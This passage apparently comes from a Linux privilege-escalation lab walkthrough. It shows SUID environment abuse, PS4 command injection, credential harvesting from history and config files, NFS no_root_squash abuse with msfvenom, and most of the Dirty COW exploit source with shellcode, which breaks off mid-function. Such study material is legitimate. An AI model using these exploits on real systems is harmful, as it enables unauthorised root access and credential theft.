+</code></pre><p>The version of <code>bash</code> can be found using <code>/bin/bash --version</code>. The output is similar to</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="GNU%20bash,%20version%204.1.5(1)-release%20(x86_64-pc-linux-gnu)%0ACopyright%20(C)%202009%20Free%20Software%20Foundation,%20Inc.%0ALicense%20GPLv3+:%20GNU%20GPL%20version%203%20or%20later%20%3Chttp://gnu.org/licenses/gpl.html%3E%0A%0AThis%20is%20free%20software;%20you%20are%20free%20to%20change%20and%20redistribute%20it.%0AThere%20is%20NO%20WARRANTY,%20to%20the%20extent%20permitted%20by%20law." type="button"></button></div></div><pre><code>GNU bash, version 4.1.5(1)-release (x86_64-pc-linux-gnu)
+Copyright (C) 2009 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
+
+This is free software; you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+</code></pre><p>Create a <code>shell function</code> to spawn a <code>privilege shell</code>.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="function%20/usr/sbin/service%20%7B%20/bin/bash%20-p;%20%7D" type="button"></button></div></div><pre><code>function /usr/sbin/service { /bin/bash -p; }
+</code></pre><p>Export the function to be made avaiable to current shell.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="export%20-f%20/usr/sbin/service" type="button"></button></div></div><pre><code>export -f /usr/sbin/service
+</code></pre><p>Execute the binary to gain a <code>privilege shell</code>.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="/usr/local/bin/suid-env2" type="button"></button></div></div><pre><code>/usr/local/bin/suid-env2
+</code></pre><h2 id="task-15---suid--sgid-executables---abusing-shell-features-2">Task 15 - SUID / SGID Executables - Abusing Shell Features (#2)</h2><p>In <code>bash</code> versions less than <code>4.4</code>, the environment variable <code>PS4</code> is used to display an extra prompt for debugging statements.</p><p>Enable <code>bash debugging</code> and set <code>PS4</code> variable to an embedded command. If the binary which has <code>suid</code> set is run, it will execute the embedded command before actual command execution.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="env%20-i%20SHELLOPTS=xtrace%20PS4='$(cp%20/bin/bash%20/tmp/rootbash;%20chmod%20+xs%20/tmp/rootbash)'%20/usr/local/bin/suid-env2" type="button"></button></div></div><pre><code>env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
+</code></pre><p>The output will be similar to</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="/usr/sbin/service%20apache2%20start%0Abasename%20/usr/sbin/service%0AVERSION='service%20ver.%200.91-ubuntu1'%0Abasename%20/usr/sbin/service%0AUSAGE='Usage:%20service%20%3C%20option%20%3E%20%7C%20--status-all%20%7C%20[%20service_name%20[%20command%20%7C%20--full-restart%20]%20]'%0ASERVICE=%0AACTION=%0ASERVICEDIR=/etc/init.d%0AOPTIONS=%0A'['%202%20-eq%200%20']'%0Acd%20/%0A'['%202%20-gt%200%20']'%0Acase%20%22$%7B1%7D%22%20in%0A'['%20-z%20''%20-a%202%20-eq%201%20-a%20apache2%20=%20--status-all%20']'%0A'['%202%20-eq%202%20-a%20start%20=%20--full-restart%20']'%0A'['%20-z%20''%20']'%0ASERVICE=apache2%0Ashift%0A'['%201%20-gt%200%20']'%0Acase%20%22$%7B1%7D%22%20in%0A'['%20-z%20apache2%20-a%201%20-eq%201%20-a%20start%20=%20--status-all%20']'%0A'['%201%20-eq%202%20-a%20''%20=%20--full-restart%20']'%0A'['%20-z%20apache2%20']'%0A'['%20-z%20''%20']'%0AACTION=start%0Ashift%0A'['%200%20-gt%200%20']'%0A'['%20-r%20/etc/init/apache2.conf%20']'%0A'['%20-x%20/etc/init.d/apache2%20']'%0Aexec%20env%20-i%20LANG=%20PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin%20TERM=dumb%20/etc/init.d/apache2%20start%0AStarting%20web%20server:%20apache2httpd%20(pid%201653)%20already%20running%0A." type="button"></button></div></div><pre><code>/usr/sbin/service apache2 start
+basename /usr/sbin/service
+VERSION='service ver. 0.91-ubuntu1'
+basename /usr/sbin/service
+USAGE='Usage: service &lt; option &gt; | --status-all | [ service_name [ command | --full-restart ] ]'
+SERVICE=
+ACTION=
+SERVICEDIR=/etc/init.d
+OPTIONS=
+'[' 2 -eq 0 ']'
+cd /
+'[' 2 -gt 0 ']'
+case "${1}" in
+'[' -z '' -a 2 -eq 1 -a apache2 = --status-all ']'
+'[' 2 -eq 2 -a start = --full-restart ']'
+'[' -z '' ']'
+SERVICE=apache2
+shift
+'[' 1 -gt 0 ']'
+case "${1}" in
+'[' -z apache2 -a 1 -eq 1 -a start = --status-all ']'
+'[' 1 -eq 2 -a '' = --full-restart ']'
+'[' -z apache2 ']'
+'[' -z '' ']'
+ACTION=start
+shift
+'[' 0 -gt 0 ']'
+'[' -r /etc/init/apache2.conf ']'
+'[' -x /etc/init.d/apache2 ']'
+exec env -i LANG= PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin TERM=dumb /etc/init.d/apache2 start
+Starting web server: apache2httpd (pid 1653) already running
+.
+</code></pre><p>Execute the binary <code>/tmp/rootbash -p</code> to spawn a <code>privilege shell</code>.</p><h2 id="task-16---passwords--keys---history-files">Task 16 - Passwords &amp; Keys - History Files</h2><p>The <code>bash</code> history contains clear text of commands, and if the password is passed via command, it can be retrieved from history command and files <code>.bash_history</code> using <code>cat ~/.*history</code>.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="ls%20-al%0Acat%20.bash_history%0Als%20-al%0Amysql%20-h%20somehost.local%20-uroot%20-ppassword123%0Aexit%0Acd%20/tmp%0Aclear%0Aifconfig%0Anetstat%20-antp%0Anano%20myvpn.ovpn%0Als%0Aexit" type="button"></button></div></div><pre><code>ls -al
+cat .bash_history
+ls -al
+mysql -h somehost.local -uroot -ppassword123
+exit
+cd /tmp
+clear
+ifconfig
+netstat -antp
+nano myvpn.ovpn
+ls
+exit
+</code></pre><h2 id="task-17---passwords--keys---config-files">Task 17 - Passwords &amp; Keys - Config Files</h2><p>Some service and config files can store passwords in clear text, which can be easily exploited.</p><p>The vpn config file <code>myvpn.ovpn</code> stores the location of file, which stores password in clear text. It can be checked using <code>cat myvpn.ovpn</code>.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="client%0Adev%20tun%0Aproto%20udp%0Aremote%2010.10.10.10%201194%0Aresolv-retry%20infinite%0Anobind%0Apersist-key%0Apersist-tun%0Aca%20ca.crt%0Atls-client%0Aremote-cert-tls%20server%0Aauth-user-pass%20/etc/openvpn/auth.txt%0Acomp-lzo%0Averb%201%0Areneg-sec%200" type="button"></button></div></div><pre><code>client
+dev tun
+proto udp
+remote 10.10.10.10 1194
+resolv-retry infinite
+nobind
+persist-key
+persist-tun
+ca ca.crt
+tls-client
+remote-cert-tls server
+auth-user-pass /etc/openvpn/auth.txt
+comp-lzo
+verb 1
+reneg-sec 0
+</code></pre><p>The file <code>/etc/openvpn/auth.txt</code> can contain privilege account password. It can be checked using <code>cat /etc/openvpn/auth.txt</code>.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="root%0A%3Cpassword%3E" type="button"></button></div></div><pre><code>root
+&lt;password&gt;
+</code></pre><h2 id="task-18---passwords--keys---ssh-keys">Task 18 - Passwords &amp; Keys - SSH Keys</h2><p>The <code>ssh</code> keys should be protected with appropriate permissions, and should not be stored elsewhere.</p><p>If the private key is readable, it can be exploited to gain <code>privilege shell</code>. The file <code>/.ssh/root_key</code> is readable.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="-----BEGIN%20RSA%20PRIVATE%20KEY-----%0A%3Ckey%3E%0A-----END%20RSA%20PRIVATE%20KEY-----" type="button"></button></div></div><pre><code>-----BEGIN RSA PRIVATE KEY-----
+&lt;key&gt;
+-----END RSA PRIVATE KEY-----
+</code></pre><p>The private key can be saved locally, and can be used to spawn <code>privilege shell</code>.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="ssh%20-i%20rootkey.txt%20root@%3Cip%3E" type="button"></button></div></div><pre><code>ssh -i rootkey.txt root@&lt;ip&gt;
+</code></pre><h2 id="task-19---nfs">Task 19 - NFS</h2><p><code>NFS</code> exports should have <code>root squashing</code> enabled, so if remote user is <code>root</code>, it will be translated to <code>nobody</code> or <code>nfsnobody</code> locally.</p><p>Check if there are any <code>nfs</code> shares exported and if <code>root squash</code> is disabled, which can be exploited. This can be checked using <code>cat /etc/exports</code>.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="/tmp%20*(rw,sync,insecure,no_root_squash,no_subtree_check)" type="button"></button></div></div><pre><code>/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
+</code></pre><p>In the source machine, sudo to root, and mount the <code>nfs</code> share.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="mount%20-o%20rw,vers=2%20%3Ctarget-ip%3E:/tmp%20/tmp/nfs" type="button"></button></div></div><pre><code>mount -o rw,vers=2 &lt;target-ip&gt;:/tmp /tmp/nfs
+</code></pre><p>Using <code>msfvenom, create a </code>reverse shell` payload.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="msfvenom%20-p%20linux/x86/exec%20CMD=%22/bin/bash%20-p%22%20-f%20elf%20-o%20/tmp/nfs/shell.elf" type="button"></button></div></div><pre><code>msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
+</code></pre><p>The output will be similar to</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="[-]%20No%20platform%20was%20selected,%20choosing%20Msf::Module::Platform::Linux%20from%20the%20payload%0A[-]%20No%20arch%20selected,%20selecting%20arch:%20x86%20from%20the%20payload%0ANo%20encoder%20specified,%20outputting%20raw%20payload%0APayload%20size:%2048%20bytes%0AFinal%20size%20of%20elf%20file:%20132%20bytes%0ASaved%20as:%20/tmp/nfs/shell.elf" type="button"></button></div></div><pre><code>[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 48 bytes
+Final size of elf file: 132 bytes
+Saved as: /tmp/nfs/shell.elf
+</code></pre><p>Make the binary executable and set <code>suid</code> flag.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="chmod%20+xs%20/tmp/nfs/shell.elf" type="button"></button></div></div><pre><code>chmod +xs /tmp/nfs/shell.elf
+</code></pre><p>In the remote machine, execute the binary <code>/tmp/shell.elf</code> to spawn a <code>privilge shell</code>.</p><h2 id="task-20---kernel-exploits">Task 20 - Kernel Exploits</h2><h3 id="references-5">References</h3><ul><li><a href="https://github.com/InteliSecureLabs/Linux_Exploit_Suggester" target="_blank">Linux Exploit Suggester</a></ul><p>Execute the script using <code>perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl</code>. The output will be similar to</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="%20%20Linux%20Exploit%20Suggester%202%0A%0ALocal%20Kernel:%202.6.32%0ASearching%2072%20exploits...%0A%0APossible%20Exploits%0A[1]%20american-sign-language%0A%20%20%20%20CVE-2010-4347%0A%20%20%20%20Source:%20http://www.securityfocus.com/bid/45408%0A[2]%20can_bcm%0A%20%20%20%20CVE-2010-2959%0A%20%20%20%20Source:%20http://www.exploit-db.com/exploits/14814%0A[3]%20dirty_cow%0A%20%20%20%20CVE-2016-5195%0A%20%20%20%20Source:%20http://www.exploit-db.com/exploits/40616%0A[4]%20exploit_x%0A%20%20%20%20CVE-2018-14665%0A%20%20%20%20Source:%20http://www.exploit-db.com/exploits/45697%0A[5]%20half_nelson1%0A%20%20%20%20Alt:%20econet%20%20%20%20%20%20%20CVE-2010-3848%0A%20%20%20%20Source:%20http://www.exploit-db.com/exploits/17787%0A[6]%20half_nelson2%0A%20%20%20%20Alt:%20econet%20%20%20%20%20%20%20CVE-2010-3850%0A%20%20%20%20Source:%20http://www.exploit-db.com/exploits/17787%0A[7]%20half_nelson3%0A%20%20%20%20Alt:%20econet%20%20%20%20%20%20%20CVE-2010-4073%0A%20%20%20%20Source:%20http://www.exploit-db.com/exploits/17787%0A[8]%20msr%0A%20%20%20%20CVE-2013-0268%0A%20%20%20%20Source:%20http://www.exploit-db.com/exploits/27297%0A[9]%20pktcdvd%0A%20%20%20%20CVE-2010-3437%0A%20%20%20%20Source:%20http://www.exploit-db.com/exploits/15150%0A[10]%20ptrace_kmod2%0A%20%20%20%20Alt:%20ia32syscall,robert_you_suck%20%20%20%20%20%20%20CVE-2010-3301%0A%20%20%20%20Source:%20http://www.exploit-db.com/exploits/15023%0A[11]%20rawmodePTY%0A%20%20%20%20CVE-2014-0196%0A%20%20%20%20Source:%20http://packetstormsecurity.com/files/download/126603/cve-2014-0196-md.c%0A[12]%20rds%0A%20%20%20%20CVE-2010-3904%0A%20%20%20%20Source:%20http://www.exploit-db.com/exploits/15285%0A[13]%20reiserfs%0A%20%20%20%20CVE-2010-1146%0A%20%20%20%20Source:%20http://www.exploit-db.com/exploits/12130%0A[14]%20video4linux%0A%20%20%20%20CVE-2010-3081%0A%20%20%20%20Source:%20http://www.exploit-db.com/exploits/15024" type="button"></button></div></div><pre><code>  Linux Exploit Suggester 2
+
+Local Kernel: 2.6.32
+Searching 72 exploits...
+
+Possible Exploits
+[1] american-sign-language
+    CVE-2010-4347
+    Source: http://www.securityfocus.com/bid/45408
+[2] can_bcm
+    CVE-2010-2959
+    Source: http://www.exploit-db.com/exploits/14814
+[3] dirty_cow
+    CVE-2016-5195
+    Source: http://www.exploit-db.com/exploits/40616
+[4] exploit_x
+    CVE-2018-14665
+    Source: http://www.exploit-db.com/exploits/45697
+[5] half_nelson1
+    Alt: econet       CVE-2010-3848
+    Source: http://www.exploit-db.com/exploits/17787
+[6] half_nelson2
+    Alt: econet       CVE-2010-3850
+    Source: http://www.exploit-db.com/exploits/17787
+[7] half_nelson3
+    Alt: econet       CVE-2010-4073
+    Source: http://www.exploit-db.com/exploits/17787
+[8] msr
+    CVE-2013-0268
+    Source: http://www.exploit-db.com/exploits/27297
+[9] pktcdvd
+    CVE-2010-3437
+    Source: http://www.exploit-db.com/exploits/15150
+[10] ptrace_kmod2
+    Alt: ia32syscall,robert_you_suck       CVE-2010-3301
+    Source: http://www.exploit-db.com/exploits/15023
+[11] rawmodePTY
+    CVE-2014-0196
+    Source: http://packetstormsecurity.com/files/download/126603/cve-2014-0196-md.c
+[12] rds
+    CVE-2010-3904
+    Source: http://www.exploit-db.com/exploits/15285
+[13] reiserfs
+    CVE-2010-1146
+    Source: http://www.exploit-db.com/exploits/12130
+[14] video4linux
+    CVE-2010-3081
+    Source: http://www.exploit-db.com/exploits/15024
+</code></pre><p>The current kernel is vulnerable to <code>dirty cow</code> exploit.</p><p>Compile the code to exploit the kernel vulnerability.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="gcc%20-pthread%20/home/user/tools/kernel-exploits/dirtycow/c0w.c%20-o%20c0w" type="button"></button></div></div><pre><code>gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w
+</code></pre><p>The exploit code is similar to below.</p><div class="code-header"><div class="copy-code-container"> <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="#include%20%3Cstdio.h%3E%0A#include%20%3Cstdlib.h%3E%0A#include%20%3Csys/mman.h%3E%0A#include%20%3Cfcntl.h%3E%0A#include%20%3Cpthread.h%3E%0A#include%20%3Cstring.h%3E%0A#include%20%3Cunistd.h%3E%0A%0Avoid%20*map;%0Aint%20f;%0Aint%20stop%20=%200;%0Astruct%20stat%20st;%0Achar%20*name;%0Apthread_t%20pth1,pth2,pth3;%0A%0Achar%20suid_binary[]%20=%20%22/usr/bin/passwd%22;%0A%0A/*%20$%20msfvenom%20-p%20linux/x64/exec%20CMD=/bin/bash%20PrependSetuid=True%20-f%20elf%20%7C%20xxd%20-i%20*/%0Aunsigned%20char%20sc[]%20=%20%7B%0A%20%200x7f,%200x45,%200x4c,%200x46,%200x02,%200x01,%200x01,%200x00,%200x00,%200x00,%200x00,%200x00,%0A%20%200x00,%200x00,%200x00,%200x00,%200x02,%200x00,%200x3e,%200x00,%200x01,%200x00,%200x00,%200x00,%0A%20%200x78,%200x00,%200x40,%200x00,%200x00,%200x00,%200x00,%200x00,%200x40,%200x00,%200x00,%200x00,%0A%20%200x00,%200x00,%200x00,%200x00,%200x00,%200x00,%200x00,%200x00,%200x00,%200x00,%200x00,%200x00,%0A%20%200x00,%200x00,%200x00,%200x00,%200x40,%200x00,%200x38,%200x00,%200x01,%200x00,%200x00,%200x00,%0A%20%200x00,%200x00,%200x00,%200x00,%200x01,%200x00,%200x00,%200x00,%200x07,%200x00,%200x00,%200x00,%0A%20%200x00,%200x00,%200x00,%200x00,%200x00,%200x00,%200x00,%200x00,%200x00,%200x00,%200x40,%200x00,%0A%20%200x00,%200x00,%200x00,%200x00,%200x00,%200x00,%200x40,%200x00,%200x00,%200x00,%200x00,%200x00,%0A%20%200xb1,%200x00,%200x00,%200x00,%200x00,%200x00,%200x00,%200x00,%200xea,%200x00,%200x00,%200x00,%0A%20%200x00,%200x00,%200x00,%200x00,%200x00,%200x10,%200x00,%200x00,%200x00,%200x00,%200x00,%200x00,%0A%20%200x48,%200x31,%200xff,%200x6a,%200x69,%200x58,%200x0f,%200x05,%200x6a,%200x3b,%200x58,%200x99,%0A%20%200x48,%200xbb,%200x2f,%200x62,%200x69,%200x6e,%200x2f,%200x73,%200x68,%200x00,%200x53,%200x48,%0A%20%200x89,%200xe7,%200x68,%200x2d,%200x63,%200x00,%200x00,%200x48,%200x89,%200xe6,%200x52,%200xe8,%0A%20%200x0a,%200x00,%200x00,%200x00,%200x2f,%200x62,%200x69,%200x6e,%200x2f,%200x62,%200x61,%200x73,%0A%20%200x68,%200x00,%200x56,%200x57,%200x48,%200x89,%200xe6,%200x0f,%200x05%0A%7D;%0Aunsigned%20int%20sc_len%20=%20177;%0A%0A/*%0A*%20$%20msfvenom%20-p%20linux/x86/exec%20CMD=/bin/bash%20PrependSetuid=True%20-f%20elf%20%7C%20xxd%20-i%0Aunsigned%20char%20sc[]%20=%20%7B%0A%20%200x7f,%200x45,%200x4c,%200x46,%200x01,%200x01,%200x01,%200x00,%200x00,%200x00,%200x00,%200x00,%0A%20%200x00,%200x00,%200x00,%200x00,%200x02,%200x00,%200x03,%200x00,%200x01,%200x00,%200x00,%200x00,%0A%20%200x54,%200x80,%200x04,%200x08,%200x34,%200x00,%200x00,%200x00,%200x00,%200x00,%200x00,%200x00,%0A%20%200x00,%200x00,%200x00,%200x00,%200x34,%200x00,%200x20,%200x00,%200x01,%200x00,%200x00,%200x00,%0A%20%200x00,%200x00,%200x00,%200x00,%200x01,%200x00,%200x00,%200x00,%200x00,%200x00,%200x00,%200x00,%0A%20%200x00,%200x80,%200x04,%200x08,%200x00,%200x80,%200x04,%200x08,%200x88,%200x00,%200x00,%200x00,%0A%20%200xbc,%200x00,%200x00,%200x00,%200x07,%200x00,%200x00,%200x00,%200x00,%200x10,%200x00,%200x00,%0A%20%200x31,%200xdb,%200x6a,%200x17,%200x58,%200xcd,%200x80,%200x6a,%200x0b,%200x58,%200x99,%200x52,%0A%20%200x66,%200x68,%200x2d,%200x63,%200x89,%200xe7,%200x68,%200x2f,%200x73,%200x68,%200x00,%200x68,%0A%20%200x2f,%200x62,%200x69,%200x6e,%200x89,%200xe3,%200x52,%200xe8,%200x0a,%200x00,%200x00,%200x00,%0A%20%200x2f,%200x62,%200x69,%200x6e,%200x2f,%200x62,%200x61,%200x73,%200x68,%200x00,%200x57,%200x53,%0A%20%200x89,%200xe1,%200xcd,%200x80%0A%7D;%0Aunsigned%20int%20sc_len%20=%20136;%0A*/%0A%0Avoid%20*madviseThread(void%20*arg)%0A%7B%0A%20%20char%20*str;%0A%20%20str=(char*)arg;%0A%20%20int%20i,c=0;%0A%20%20for(i=0;i%3C1000000%20&amp;&amp;%20!stop;i++)%20%7B%0A%20%20%20%20c+=madvise(map,100,MADV_DONTNEED);%0A%20%20%7D%0A%20%20printf(%22thread%20stopped%5Cn%22);%0A%7D%0A%0Avoid%20*procselfmemThread(void%20*arg)%0A%7B%0A%20%20char%20*str;%0A%20%20str=(char*)arg;%0A%20%20int%20f=open(%22/proc/self/mem%22,O_RDWR);%0A%20%20int%20i,c=0;%0A%20%20for(i=0;i%3C1000000%20&amp;&amp;%20!stop;i++)%20%7B%0A%20%20%20%20lseek(f,map,SEEK_SET);%0A%20%20%20%20c+=write(f,%20str,%20sc_len);%0A%20%20%7D%0A%20%20printf(%22thread%20stopped%5Cn%22);%0A%7D%0A%0Avoid%20*waitForWrite(void%20*arg)%20%7B%0A%20%20char%20buf[sc_len];%0A%0A%20%20for(;;)%20%7B%0A%20%20%20%20FILE%20*fp%20=%20fopen(suid_binary,%20%22rb%22);%0A%0A%20%20%20%20fread(buf,%20sc_len,%201,%20fp);%0A%0A%20%20%20%20if(memcmp(buf,%20sc,%20sc_len)%20==%200)%20%7B%0A%20%20%20%20%20%20printf(%22%25s%20is%20overwritten%5Cn%22,%20suid_binary);%0A%20%20%20%20%20%20break;%0A%20%20%20%20%7D%0A%0A%20%20%20%20fclose(fp);%0A%20%20%20%20sleep(1);%0A%20%20%7D%0A%0A%20%20stop%20=%201;%0A%0A%20%20printf(%22Popping%20root%20shell.%5Cn%22);%0A%20%20printf(%22Don't%20forget%20to%20restore%20/tmp/bak%5Cn%22);%0A%0A%20%20system(suid_binary);%0A%7D%0A%0Aint%20main(int%20argc,char%20*argv[])%20%7B%0A%20%20char%20*backup;%0A%0A%20%20printf(%22DirtyCow%20root%20privilege%20escalation%5Cn%22);%0A%20%20printf(%22Backing%20up%20%25s..%20to%20/tmp/bak%5Cn%22,%20suid_binary);%0A%0A%20%20asprintf(&amp;backup,%20%22cp%20%25s%20/tmp/bak%22,%20suid_binary);%0A%20%20system(backup);%0A%0A%20%20f%20=%20open(suid_binary,O_RDONLY);%0A%20%20fstat(f,&amp;st);%0A%0A%20%20printf(%22Size%20of%20binary:%20%25d%5Cn%22,%20st.st_size);%0A%0A%20%20char%20payload[st.st_size];%0A%20%20memset(payload,%200x90,%20st.st_size);%0A%20%20memcpy(payload,%20sc,%20sc_len+1);%0A%0A%20%20map%20=%20mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);%0A%0A%20%20printf(%22Racing,%20this%20may%20take%20a%20while..%5Cn%22);%0A%0A%20%20pthread_create(&amp;pth1,%20NULL,%20&amp;madviseThread,%20suid_binary);%0A%20%20pthread_create(&amp;pth2,%20NULL,%20&amp;procselfmemThread,%20payload);%0A%20%20pthread_create(&amp;pth3,%20NULL,%20&amp;waitForWrite,%20NULL);%0A%0A%20%20pthread_join(pth3,%20NULL);%0A%0A%20%20return%200;%0A%7D" type="button"></button></div></div><pre><code>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;sys/mman.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;pthread.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+
+void *map;
+int f;
+int stop = 0;
+struct stat st;
+char *name;
+pthread_t pth1,pth2,pth3;
+
+char suid_binary[] = "/usr/bin/passwd";
+
+/* $ msfvenom -p linux/x64/exec CMD=/bin/bash PrependSetuid=True -f elf | xxd -i */
+unsigned char sc[] = {
+  0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,
+  0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0xb1, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xea, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x48, 0x31, 0xff, 0x6a, 0x69, 0x58, 0x0f, 0x05, 0x6a, 0x3b, 0x58, 0x99,
+  0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x53, 0x48,
+  0x89, 0xe7, 0x68, 0x2d, 0x63, 0x00, 0x00, 0x48, 0x89, 0xe6, 0x52, 0xe8,
+  0x0a, 0x00, 0x00, 0x00, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x62, 0x61, 0x73,
+  0x68, 0x00, 0x56, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05
+};
+unsigned int sc_len = 177;
+
+/*
+* $ msfvenom -p linux/x86/exec CMD=/bin/bash PrependSetuid=True -f elf | xxd -i
+unsigned char sc[] = {
+  0x7f, 0x45, 0x4c, 0x46, 0x01, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x03, 0x00, 0x01, 0x00, 0x00, 0x00,
+  0x54, 0x80, 0x04, 0x08, 0x34, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x34, 0x00, 0x20, 0x00, 0x01, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x00, 0x80, 0x04, 0x08, 0x00, 0x80, 0x04, 0x08, 0x88, 0x00, 0x00, 0x00,
+  0xbc, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00,
+  0x31, 0xdb, 0x6a, 0x17, 0x58, 0xcd, 0x80, 0x6a, 0x0b, 0x58, 0x99, 0x52,
+  0x66, 0x68, 0x2d, 0x63, 0x89, 0xe7, 0x68, 0x2f, 0x73, 0x68, 0x00, 0x68,
+  0x2f, 0x62, 0x69, 0x6e, 0x89, 0xe3, 0x52, 0xe8, 0x0a, 0x00, 0x00, 0x00,
+  0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x62, 0x61, 0x73, 0x68, 0x00, 0x57, 0x53,
+  0x89, 0xe1, 0xcd, 0x80
+};
+unsigned int sc_len = 136;
+*/
+
+void *madviseThread(void *arg)
+{
+  char *str;
+  str=(char*)arg;
+  int i,c=0;
+  for(i=0;i&lt;1000000 &amp;&amp; !stop;i++) {
+    c+=madvise(map,100,MADV_DONTNEED);
+  }
+  printf("thread stopped\n");
+}
+
+void *procselfmemThread(void *arg)
+{
+  char *str;
+  str=(char*)arg;
+  int f=open("/proc/self/mem",O_RDWR);
+  int i,c=0;
+  for(i=0;i&lt;1000000 &amp;&amp; !stop;i++) {
+    lseek(f,map,SEEK_SET);
+    c+=write(f, str, sc_len);
+  }
+  printf("thread stopped\n");
+}
+
+void *waitForWrite(void *arg) {
+  char buf[sc_len];
+
+  for(;;) {
+    FILE *fp = fopen(suid_binary, "rb");
+
+    fread(buf, sc_len, 1, fp);
+
+    if(memcmp(buf, sc, sc_len) == 0) {
+      printf("%s is overwritten\n", suid_binary);
+      break;
+    }
+
+    fclose(fp);
+    sleep(1);
+  }
+
+  stop = 1;
+
+  printf("Popping root shell.\n");
+  printf("Don't forget to restore /tmp/bak\n");
+
+  system(suid_binary);
+}
+
+int main(int argc,char *argv[]) {
+  char *backup;
+
+  printf("DirtyCow root privilege escalation\n");
+  printf("Backing up %s.. to /tmp/bak\n", suid_binary);
+
+  asprintf(&amp;backup, "cp %s /tmp/bak", suid_binary);
+  system(backup);
+
+  f = open(suid_binary,O_RDONLY);
+  fstat(f,&amp;st);
+
+  printf("Size of binary: %d\n", st.st_size);
+
+  char payload[st.st_size];
+  memset(payload, 0x90, st.st_size);
+  memcpy(payload, sc, sc_len+1);
+
+  map = mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);
+
+  printf("Racing, this may take a while..\n");
+
+  pthread_create(&amp;pth1, NULL, &amp;madviseThread, suid_binary);
+  pthread_create(&amp;pth2, NULL, &amp;procselfmemThread, payload);
+  pthread_create(&amp;pth3, NULL, &amp;waitForWrite, NULL);
+
